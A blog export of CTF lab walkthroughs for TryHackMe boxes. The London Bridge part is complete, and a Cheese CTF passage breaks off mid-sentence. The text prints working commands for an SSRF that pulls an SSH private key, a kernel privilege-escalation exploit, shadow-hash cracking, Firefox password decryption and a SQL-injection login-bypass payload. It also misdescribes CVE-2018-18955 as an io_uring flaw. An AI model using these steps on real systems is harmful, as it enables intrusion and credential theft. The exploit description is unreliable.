[{"categories":["CTF","Forensic"],"content":"Introduction Detailed walkthroughs for The London Bridge CTF challenges on TryHackMe .\nShell as beth echo \u0026#34;10.10.72.132 londonbridge.thm\u0026#34; \u0026gt;\u0026gt; /etc/hosts Mappped the ip to domain londonbridge.thm.\nRustscan $ rustscan -a londonbridge.thm -- -sC -sV PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDziNs6aSHIQOJFilv8PhCPd676iD1TrhMYe4p4Mj2E3yaAl4xb8DNT2dhpcv6H8EvtCJnAbXmnFTTOZy14fd7FKc2/Mr4MNLsINFpMU8hc85g6S9ZEnWKlU8dw5jUUeZnAbHSTnq6ARvEbT/Y5seiWEJ7IBiUqptlUA2eiOU7g0DFwrYH7n40aDe0m6PKPIfI9G0XO0cJHISeJ0bsSES1uun2WHLM0sRx+17hrBgM2YfD9OevcltVMlQqWasP9lqf2ooOdBvQTq4eH5UyyuEzaRtQwBYP/wWQEVFacejJE1iT2VD6ZAilhlzo9mww9vqTEwGTvatH65wiyCZHMvrSb | 256 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJuZrGZxDIlI4pU1KNZ8A87cWFcgHxRSt7yFgBtJoUQMhNmcw8FSVC54b7sBYXCgBsgISZfWYPjBM9kikh8Jnkw= | 256 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICkCeqFADY/YvhJyJabcs5DVTYbl/DEKEpBoluTuDdB1 8080/tcp open http-proxy syn-ack ttl 60 gunicorn |_http-server-header: gunicorn | fingerprint-strings: | GetRequest: | HTTP/1.0 200 OK | Server: gunicorn | Date: Mon, 30 Sep 2024 16:13:38 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 2682 | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Explore London\u0026lt;/title\u0026gt; | \u0026lt;style\u0026gt; | body { | font-family: Arial, sans-serif; | margin: 0; | padding: 0; | background-color: #f2f2f2; | header { | background-color: #333; | color: #fff; | padding: 10px 20px; | text-align: center; | background-color: #444; | color: #fff; | padding: 10px 20px; | text-align: center; | color: #fff; | text-decoration: none; | margin: 0 10p | HTTPOptions: | HTTP/1.0 200 OK | Server: gunicorn | Date: Mon, 30 Sep 2024 16:13:39 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Allow: HEAD, OPTIONS, GET |_ Content-Length: 0 | http-methods: |_ Supported Methods: HEAD OPTIONS GET |_http-title: Explore London Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel From the above result we know,\n2 open ports are available port 22 (ssh) and port 8080 (web server). SSH version: OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 Web server: Server: gunicorn Methods Allowed: HEAD, OPTIONS, GET Web server (port:8080) Home Page Here is the Welcome page of the web server.\nGallery We have a gallery page, where we can upload our photos(images) here, it will immediately reflect on the page. Uploading files other than images giving Uploaded file is not image error.\nContact page In contact page, we can leave our feedback.\nFeedback page Here is the feedback page after giving feedback in contact page.\nffuf $ ffuf -c -u http://londonbridge.thm:8080/FUZZ -w /usr/share/wordlists/dirb/big.txt ________________________________________________ contact [Status: 200, Size: 1703, Words: 549, Lines: 60, Duration: 161ms] feedback [Status: 405, Size: 178, Words: 20, Lines: 5, Duration: 155ms] gallery [Status: 200, Size: 1722, Words: 484, Lines: 55, Duration: 376ms] upload [Status: 405, Size: 178, Words: 20, Lines: 5, Duration: 152ms] view_image [Status: 405, Size: 178, Words: 20, Lines: 5, Duration: 152ms] Got some interesting result from ffuf. From the above results we have visited app pages expect one view_image.\nBurpSuite: /view_image While checking for /view_image we are getting Method Not Allowed error. Now lets change the method type to POST.\nView Image page By changing the request from GET to POST, we are able to access /view_image page where we can give image url as input.\nUsing Image url BurpSuite using image url If we gave image url, this page is loading and showing the image on the same page. Lets try to use this for reverse shell.\nTried uploading multiple payloads using url, but no exploits worked. It\u0026rsquo;s because directly image url is added in image tag, without backend processing. Lets look into hint provided.\n# Hint Check for other parameters that may been left over during the development phase. If one list doesn't work, try another common one. From the above hint we need to try fuzzing for another parameter. The parameter which we already have is image_url. We need to find the parameter which is missed in development phase.\nSSRF ffuf -c -X POST -u http://londonbridge.thm:8080/view_image -d \u0026#34;FUZZ=http://$attacker_ip/Exif.png\u0026#34; -H \u0026#34;Content-Type: application/x-www-form-urlencoded\u0026#34; -w /usr/share/wordlists/dirb/big.txt -fs 823 ________________________________________________ www [Status: 200, Size: 194199, Words: 424, Lines: 357, Duration: 2264ms] When using ffuf to fuzz the paramater we got the result www. Lets test the parameter www.\ncurl -X POST http://londonbridge.thm:8080/view_image -d \u0026#34;www=http://127.0.0.1\u0026#34; -H \u0026#34;Content-Type: application/x-www-form-urlencoded\u0026#34; \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//W3C//DTD HTML 3.2 Final//EN\u0026#34;\u0026gt; \u0026lt;title\u0026gt;403 Forbidden\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Forbidden\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;You don\u0026amp;#x27;t have the permission to access the requested resource. It is either read-protected or not readable by the server.\u0026lt;/p\u0026gt; When trying to access localhost, we encountered the error You don’t have permission to access the requested resource. This means that we simply do not have the necessary permissions. If our access were upgraded, we could access the resources on localhost. Additionally, we discovered an SSRF vulnerability.\nLets try to bypass the access issue or input filter using SSRF with blacklist-based input filters .\n$ curl -X POST http://londonbridge.thm:8080/view_image -d \u0026#34;www=http://2130706433\u0026#34; -H \u0026#34;Content-Type: application/x-www-form-urlencoded\u0026#34; \u0026lt;HTML\u0026gt; \u0026lt;body bgcolor=\u0026#34;gray\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;London brigde\u0026lt;/h1\u0026gt; \u0026lt;img height=400px width=600px src =\u0026#34;static/1.webp\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;font type=\u0026#34;monotype corsiva\u0026#34; size=18\u0026gt;London Bridge is falling down\u0026lt;br\u0026gt; Falling down, falling down\u0026lt;br\u0026gt; London Bridge is falling down\u0026lt;br\u0026gt; My fair lady\u0026lt;br\u0026gt; Build it up with iron bars\u0026lt;br\u0026gt; Iron bars, iron bars\u0026lt;br\u0026gt; Build it up with iron bars\u0026lt;br\u0026gt; My fair lady\u0026lt;br\u0026gt; Iron bars will bend and break\u0026lt;br\u0026gt; Bend and break, bend and break\u0026lt;br\u0026gt; Iron bars will bend and break\u0026lt;br\u0026gt; My fair lady\u0026lt;br\u0026gt; \u0026lt;img height=400px width=600px src=\u0026#34;static/2.webp\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;font type=\u0026#34;monotype corsiva\u0026#34; size=18\u0026gt;Build it up with gold and silver\u0026lt;br\u0026gt; Gold and silver, gold and silver\u0026lt;br\u0026gt; Build it up with gold and silver\u0026lt;br\u0026gt; My fair lady\u0026lt;br\u0026gt; Gold and silver we\u0026#39;ve not got\u0026lt;br\u0026gt; We\u0026#39;ve not got, we\u0026#39;ve not got\u0026lt;br\u0026gt; Gold and silver we\u0026#39;ve not got\u0026lt;br\u0026gt; My fair lady\u0026lt;br\u0026gt; \u0026lt;img height=400px width=600px src=\u0026#34;static/3.jpg\u0026#34;\u0026gt;\u0026lt;br\u0026gt; London Bridge is falling down\u0026lt;br\u0026gt; Falling down, falling down\u0026lt;br\u0026gt; London Bridge is falling down\u0026lt;br\u0026gt; My fair lady\u0026lt;br\u0026gt; London Bridge is falling down\u0026lt;br\u0026gt; Falling down, falling down\u0026lt;br\u0026gt; London Bridge is falling down\u0026lt;br\u0026gt; My fair beth\u0026lt;/font\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/HTML\u0026gt; We got a positive response from the server. Lets try to check the ports opened in localhost.\n$ ffuf -c -X POST -u http://londonbridge.thm:8080/view_image -d \u0026#34;www=http://2130706433:FUZZ\u0026#34; -H \u0026#34;Content-Type: application/x-www-form-urlencoded\u0026#34; -w 65536_ports.txt -fc 500 ________________________________________________ 80 [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 171ms] 8080 [Status: 200, Size: 2682, Words: 871, Lines: 83, Duration: 276ms] We got 2 results, where port 8080 is accessible from internet and port 80 is only for localhost. Lets try to fuzz for files/directories in port 80.\nExtracting private key $ ffuf -c -X POST -u http://londonbridge.thm:8080/view_image -d \u0026#34;www=http://2130706433/FUZZ\u0026#34; -H \u0026#34;Content-Type: application/x-www-form-urlencoded\u0026#34; -w /usr/share/wordlists/dirb/big.txt -fs 469 ________________________________________________ .ssh [Status: 200, Size: 399, Words: 18, Lines: 17, Duration: 164ms] .bashrc [Status: 200, Size: 3771, Words: 522, Lines: 118, Duration: 182ms] .profile [Status: 200, Size: 807, Words: 128, Lines: 28, Duration: 187ms] .bash_history [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 215ms] static [Status: 200, Size: 420, Words: 19, Lines: 18, Duration: 262ms] templates [Status: 200, Size: 1294, Words: 358, Lines: 44, Duration: 162ms] uploads [Status: 200, Size: 630, Words: 23, Lines: 22, Duration: 254ms] While fuzzing we gots some results which we can find in home directory of the user. Here interesting result is .ssh where we will have the authorized_keys and ssh private keys.\n$ curl -X POST http://londonbridge.thm:8080/view_image -H \u0026#34;Content-Type: application/x-www-form-urlencoded\u0026#34; -d \u0026#34;www=http://2130706433/.ssh/authorized_keys\u0026#34; ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPXIWuD0UBkAjhHftpBaf949OT8wp/PYpD44TjkoSuC4vfhiPkpzVUmMNNM1GZz681FmJ4LwTB6VaCnBwoAJrvQp7ar/vNEtYeHbc5TFaJIAA5FN5rWzl66zeCFNaNx841E4CQSDs7dew3CCn3dRQHzBtT4AOlmcUs9QMSsUqhKn53EbivHCqkCnqZqqwTh0hkd0Cr5i3r/Yc4REqsVaI41Cl3pkDxrfbmhZdjxRpES8pO5dyOUvnq3iJZDOxFBsG8H4RODaZrTW78eZbcz1LKug/KlwQ6q8+e4+mpcdm7sHAAszk0eFcI2a37QQ4Fgq96OwMDo15l8mDDrk1Ur7aF beth@london By checking the authorized_keys this should be the home directory of user beth.\ncurl -X POST http://londonbridge.thm:8080/view_image -d \u0026#34;www=http://2130706433/.ssh/id_rsa\u0026#34; -H \u0026#34;Content-Type: application/x-www-form-urlencoded\u0026#34; \u0026gt; id_rsa chmod 400 id_rsa ssh beth@londonbridge.thm -i id_rsa We also got id_rsa(ssh private key). Lets use it to get reverse shell.\nbeth@london:~$ cat /home/beth/__pycache__/user.txt THM{REDACTED} We got our first flag here.\nPrivilege Escalation linpeas beth@london:~$ cat /etc/passwd | grep bash root:x:0:0:root:/root:/bin/bash beth:x:1000:1000:Elizabeth,,,:/home/beth:/bin/bash charles:x:1001:1001:King Charles,,,:/home/charles:/bin/bash There are 23users in system beth, charles and root user. Lets try to escalate our privileges.\nlets use linpeas.sh for getting privilege escalation vector.\n╔══════════╣ Sudo version ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version Sudo version 1.8.21p2 ╔══════════╣ PATH ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses /home/beth/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games ╔══════════╣ Executing Linux Exploit Suggester ╚ https://github.com/mzet-/linux-exploit-suggester [+] [CVE-2021-3156] sudo Baron Samedit Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt Exposure: probable Tags: mint=19,[ ubuntu=18|20 ], debian=10 Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main [+] [CVE-2021-3156] sudo Baron Samedit 2 Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt Exposure: probable Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10 Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main [+] [CVE-2018-18955] subuid_shell Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712 Exposure: probable Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28} Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/45886.zip Comments: CONFIG_USER_NS needs to be enabled [+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET) Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/ https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/ Exposure: less probable Tags: ubuntu=(22.04){kernel:5.15.0-27-generic} Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN) [+] [CVE-2022-2586] nft_object UAF Details: https://www.openwall.com/lists/oss-security/2022/08/29/5 Exposure: less probable Tags: ubuntu=(20.04){kernel:5.12.13} Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1 Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN) [+] [CVE-2021-22555] Netfilter heap out-of-bounds write Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html Exposure: less probable Tags: ubuntu=20.04{kernel:5.8.0-*} Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c Comments: ip_tables kernel module must be loaded [+] [CVE-2019-18634] sudo pwfeedback Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/ Exposure: less probable Tags: mint=19 Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c Comments: sudo configuration requires pwfeedback to be enabled. [+] [CVE-2019-15666] XFRM_UAF Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc Exposure: less probable Download URL: Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled [+] [CVE-2017-0358] ntfs-3g-modprobe Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072 Exposure: less probable Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2} Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41356.zip Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores. ╔════════════════════════════════════════════════╗ ════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════ ╚════════════════════════════════════════════════╝ ╔══════════╣ Running processes (cleaned) ╚ Check weird \u0026amp; unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes systemd+ 240 0.0 0.2 80088 5304 ? Ss 08:37 0:00 /lib/systemd/systemd-networkd └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw ╔══════════╣ Processes with credentials in memory (root req) ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory sshd: process found (dump creds from memory as root) ╔══════════╣ Analyzing .service files ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services /etc/systemd/system/app.service is calling this writable executable: /home/beth/ /etc/systemd/system/multi-user.target.wants/app.service is calling this writable executable: /home/beth/ ╔══════════╣ Analyzing Rsync Files (limit 70) -rw-r--r-- 1 root root 1044 Feb 13 2020 /usr/share/doc/rsync/examples/rsyncd.conf ╔══════════╣ Analyzing PGP-GPG Files (limit 70) /usr/bin/gpg -rw------- 1 beth beth 1200 Oct 1 10:53 /home/beth/.gnupg/trustdb.gpg ╔══════════╣ Searching uncommon passwd files (splunk) passwd file: /etc/pam.d/passwd passwd file: /etc/passwd passwd file: /usr/share/bash-completion/completions/passwd passwd file: /usr/share/lintian/overrides/passwd ══╣ Some home ssh config file was found /usr/share/openssh/sshd_config All the above were interesting privilege escalation vectors by using linpeas.\n╔══════════╣ Analyzing .service files ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services /etc/systemd/system/app.service is calling this writable executable: /home/beth/ /etc/systemd/system/multi-user.target.wants/app.service is calling this writable executable: /home/beth/ I have started with the services, where the executable (/home/beth/.local/bin/gunicorn) which it\u0026rsquo;s calling is writable. But we have a problem in it, the service is controlled (start/stop/restart) by root user. We need to wait for starting/restarting action of that service, in this case it is not possible.\nLets move on to next.\nCVE-2018-18955 [+] [CVE-2018-18955] subuid_shell Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712 Exposure: probable Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28} Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/45886.zip Comments: CONFIG_USER_NS needs to be enabled I\u0026rsquo;ve tried exploiting other cvulnerabilities, but CVE-2018-18955 worked for me. Lets use CVE-2018-18955 beth@london:~/tmp$ ./exploit.dbus.sh [*] Compiling... [*] Creating /usr/share/dbus-1/system-services/org.subuid.Service.service... [.] starting [.] setting up namespace [~] done, namespace sandbox set up [.] mapping subordinate ids [.] subuid: 100000 [.] subgid: 100000 [~] done, mapped subordinate ids [.] executing subshell [*] Creating /etc/dbus-1/system.d/org.subuid.Service.conf... [.] starting [.] setting up namespace [~] done, namespace sandbox set up [.] mapping subordinate ids [.] subuid: 100000 [.] subgid: 100000 [~] done, mapped subordinate ids [.] executing subshell [*] Launching dbus service... Error org.freedesktop.DBus.Error.NoReply: Did not receive a reply. Possible causes include: the remote application did not send a reply, the message bus security policy blocked the reply, the reply timeout expired, or the network connection was broken. [+] Success: -rwsrwxr-x 1 root root 8392 Oct 1 22:58 /tmp/sh [*] Cleaning up... [*] Launching root shell: /tmp/sh root@london:~/tmp# CVE-2018-18955 is a high-severity vulnerability in the Linux kernel's io_uring subsystem, introduced in version 5.1, that allows local users to escalate their privileges due to improper validation of data structures. This memory corruption flaw can be exploited through crafted I/O requests, enabling attackers to execute arbitrary code with kernel-level privileges.\nroot@london:/root# cat /root/.root.txt THM{REDACTED} We got our second flag here.\nFinding Charles Password john unshadow.txt --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 4 OpenMP threads longlivethequeen (beth) 1g 0:01:49:52 DONE 0.000151g/s 2175p/s 5276c/s 5276C/s !!!playboy!!!7..*7¡Vamos! Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. As a root user I have access to bot /etc/passwd and /etc/shadow file. So I tried to crack the password using john by unshadowed hash. But at the end I\u0026rsquo;m able to find the password of user beth.\nfirefox_decrypt root@london:/home/charles# ls -lah total 24K drw------- 3 charles charles 4.0K Apr 23 22:11 . drwxr-xr-x 4 root root 4.0K Mar 10 2024 .. lrwxrwxrwx 1 root root 9 Apr 23 22:11 .bash_history -\u0026gt; /dev/null -rw------- 1 charles charles 220 Mar 10 2024 .bash_logout -rw------- 1 charles charles 3.7K Mar 10 2024 .bashrc drw------- 3 charles charles 4.0K Mar 16 2024 .mozilla -rw------- 1 charles charles 807 Mar 10 2024 .profile When looking into home directory of user charles, found an interesting file .mozilla, where we can find all saved passwords for websites. If we are lucky, the user may used the same passwords in multile places.\nwget -r -np -nH --cut-dirs=1 http://londonbridge.thm:8000/firefox/ Transfered all contents of .mozilla using python server to the local system for further investigation.\nWhile searching in the internet got an interesting page: unode|firefox_decrypt . Lets use this github page for decrypting firefox credentials.0\n$ python firefox_decrypt.py ../firefox/8k3bf3zp.charles/ 2024-10-02 20:05:56,800 - WARNING - profile.ini not found in ../firefox/8k3bf3zp.charles/ 2024-10-02 20:05:56,800 - WARNING - Continuing and assuming \u0026#39;../firefox/8k3bf3zp.charles/\u0026#39; is a profile location Website: https://www.buckinghampalace.com Username: \u0026#39;Charles\u0026#39; Password: \u0026#39;REDACTED\u0026#39; By using the above it hub exploit we are able to succesfully extract the password of the user charles.\nWe got our final flag here.\nConclusion In conclusion, the The London Bridge CTF challenge provided a comprehensive exploration of various penetration testing techniques, from initial foothold acquisition through Rustscan and ffuf to privilege escalation via linpeas and exploitation of vulnerabilities. The successful extraction of sensitive information, including SSH keys and user credentials, demonstrates the critical importance of robust security measures against SSRF vulnerabilities and misconfigured services. Overall, this writeup illustrates effective strategies for identifying and exploiting weaknesses in a controlled environment, emphasizing the need for continuous learning and adaptation in the ever-evolving field of cybersecurity.\nHappy Hacking !!! \u0026#x1f60e;\n","permalink":"https://cyberjagadeesh.github.io/posts/thelondonbridge/writeup/","tags":["SSRF","CVE-2018-18955","ffuf"],"title":"The London Bridge | THM Writeup"},{"categories":["CTF"],"content":"Introduction Detailed walkthroughs for Cheese CTF CTF challenges on TryHackMe .\nInitial Foothold echo \u0026#34;10.10.16.91 cheese.thm\u0026#34; \u0026gt;\u0026gt; /etc/hosts Mappped the ip to domain certain-doom.thm.\nnmap nmap results Initial scan gives result as lot (n) number of ports open. May be they are tricking us not to look for what we want.\n$ nmap cheese.thm -sC -sC -p22,80 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-29 22:48 IST Nmap scan report for cheese.thm (10.10.16.91) Host is up (0.16s latency). PORT STATE SERVICE 22/tcp open ssh | ssh-hostkey: | 3072 b1:c1:22:9f:11:10:5f:64:f1:33:72:70:16:3c:80:06 (RSA) | 256 6d:33:e3:bd:70:62:59:93:4d:ab:8b:fe:ef:e8:a7:b2 (ECDSA) |_ 256 89:2e:17:84:ed:48:7a:ae:d9:8c:9b:a5:8e:24:04:bd (ED25519) 80/tcp open http |_http-title: The Cheese Shop Nmap done: 1 IP address (1 host up) scanned in 6.13 seconds I\u0026rsquo;ve confirmed that port 22 and port 80 are open.\nWebserver : port 80 Cheese Shop: Home page We got a simple home page for Cheese shop.\nCheese Shop: Login page Site also have a login page.\nffuf $ ffuf -c -u http://cheese.thm/FUZZ -w /usr/share/wordlists/dirb/big.txt -e .php images [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 156ms] login.php [Status: 200, Size: 834, Words: 220, Lines: 29, Duration: 144ms] Login.php found.\nffuf -c -u http://thecheeseshop.com/ -H \u0026#34;HOST: FUZZ.thecheeseshop.com\u0026#34; -w /usr/share/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt -fs 1759 Enumarating subdoamins failed.\nhydra hydra -L /usr/share/SecLists-master/Usernames/Names/names.txt -p testPassword cheese.thm http-post-form \u0026#34;/login.php:username=^USER^\u0026amp;password=^PASS^:Login failed. Please check your username and password.\u0026#34; Enumaration for usernames failed.\nCapture Service Banner for i in $(cat ports.txt); do echo port $i $(timeout 3 nc cheese.thm $i) \u0026gt;\u0026gt; ncOutput.txt ; done; Running this command to get the banner of all open ports. We can use this later if required.\nsqlmap $ sqlmap -u http://cheese.thm/login.php --data \u0026#34;username=admin\u0026amp;password=adminpassword\u0026#34; ___ __H__ ___ ___[,]_____ ___ ___ {1.8.8#stable} |_ -| . [.] | .\u0026#39;| . | |___|_ [)]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 07:29:47 /2024-09-30/ [07:29:47] [INFO] testing connection to the target URL [07:29:47] [INFO] testing if the target URL content is stable [07:29:48] [INFO] target URL content is stable [07:29:48] [INFO] testing if POST parameter \u0026#39;username\u0026#39; is dynamic [07:29:48] [WARNING] POST parameter \u0026#39;username\u0026#39; does not appear to be dynamic [07:29:48] [WARNING] heuristic (basic) test shows that POST parameter \u0026#39;username\u0026#39; might not be injectable [07:29:48] [INFO] testing for SQL injection on POST parameter \u0026#39;username\u0026#39; [07:29:48] [INFO] testing \u0026#39;AND boolean-based blind - WHERE or HAVING clause\u0026#39; [07:29:49] [INFO] testing \u0026#39;Boolean-based blind - Parameter replace (original value)\u0026#39; [07:29:49] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)\u0026#39; [07:29:50] [INFO] testing \u0026#39;PostgreSQL AND error-based - WHERE or HAVING clause\u0026#39; [07:29:51] [INFO] testing \u0026#39;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)\u0026#39; [07:29:52] [INFO] testing \u0026#39;Oracle AND error-based - WHERE or HAVING clause (XMLType)\u0026#39; [07:29:53] [INFO] testing \u0026#39;Generic inline queries\u0026#39; [07:29:53] [INFO] testing \u0026#39;PostgreSQL \u0026gt; 8.1 stacked queries (comment)\u0026#39; [07:29:54] [INFO] testing \u0026#39;Microsoft SQL Server/Sybase stacked queries (comment)\u0026#39; [07:29:55] [INFO] testing \u0026#39;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)\u0026#39; [07:29:56] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP)\u0026#39; [07:30:07] [INFO] POST parameter \u0026#39;username\u0026#39; appears to be \u0026#39;MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP)\u0026#39; injectable for the remaining tests, do you want to include all tests for \u0026#39;MySQL\u0026#39; extending provided level (1) and risk (1) values? [Y/n] y [07:38:05] [INFO] testing \u0026#39;Generic UNION query (NULL) - 1 to 20 columns\u0026#39; [07:38:05] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found [07:38:05] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s) [07:38:05] [WARNING] most likely web server instance hasn\u0026#39;t recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag \u0026#39;T\u0026#39; in option \u0026#39;--technique\u0026#39; (e.g. \u0026#39;--flush-session --technique=BEUS\u0026#39;) or try to lower the value of option \u0026#39;--time-sec\u0026#39; (e.g. \u0026#39;--time-sec=2\u0026#39;) got a 302 redirect to \u0026#39;http://cheese.thm/secret-script.php?file=supersecretadminpanel.html\u0026#39;. Do you want to follow? [Y/n] y redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] y [07:38:32] [INFO] target URL appears to be UNION injectable with 3 columns injection not exploitable with NULL values. Do you want to try with a random integer value for option \u0026#39;--union-char\u0026#39;? [Y/n] y [07:38:50] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. \u0026#39;--dbms=mysql\u0026#39;) [07:38:50] [INFO] checking if the injection point on POST parameter \u0026#39;username\u0026#39; is a false positive [07:38:55] [WARNING] false positive or unexploitable injection point detected [07:38:55] [WARNING] POST parameter \u0026#39;username\u0026#39; does not seem to be injectable [07:38:55] [WARNING] POST parameter \u0026#39;password\u0026#39; does not appear to be dynamic [07:38:55] [WARNING] heuristic (basic) test shows that POST parameter \u0026#39;password\u0026#39; might not be injectable [07:38:55] [INFO] testing for SQL injection on POST parameter \u0026#39;password\u0026#39; [07:38:55] [INFO] testing \u0026#39;AND boolean-based blind - WHERE or HAVING clause\u0026#39; [07:38:56] [INFO] testing \u0026#39;Boolean-based blind - Parameter replace (original value)\u0026#39; [07:38:56] [INFO] testing \u0026#39;Generic inline queries\u0026#39; it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y [07:48:00] [INFO] testing \u0026#39;Generic UNION query (31) - 1 to 10 columns\u0026#39; [07:48:00] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s) [07:48:02] [WARNING] POST parameter \u0026#39;password\u0026#39; does not seem to be injectable [07:48:02] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for \u0026#39;--level\u0026#39;/\u0026#39;--risk\u0026#39; options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option \u0026#39;--tamper\u0026#39; (e.g. \u0026#39;--tamper=space2comment\u0026#39;) and/or switch \u0026#39;--random-agent\u0026#39; Web app have SQLi vulnerability in its username parameter. Lets fuzz to get the vulnerable query parameter. Using sql-injection-payload .\n$ ffuf -c -u http://cheese.thm/login.php -d \u0026#34;username=FUZZ\u0026amp;password=adminpass\u0026#34; -H \u0026#34;Content-Type: application/x-www-form-urlencoded\u0026#34; -fs 888 -w Auth_Bypass.txt ________________________________________________ \u0026#39; OR \u0026#39;x\u0026#39;=\u0026#39;x\u0026#39;#; [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 165ms] Got a valid query parameter. Lets use this in username parameter for bypass the login.\nAdmin Panel - Cheese shop We got a simple admin panel here.\nSecret Message for Admin We also have some secret 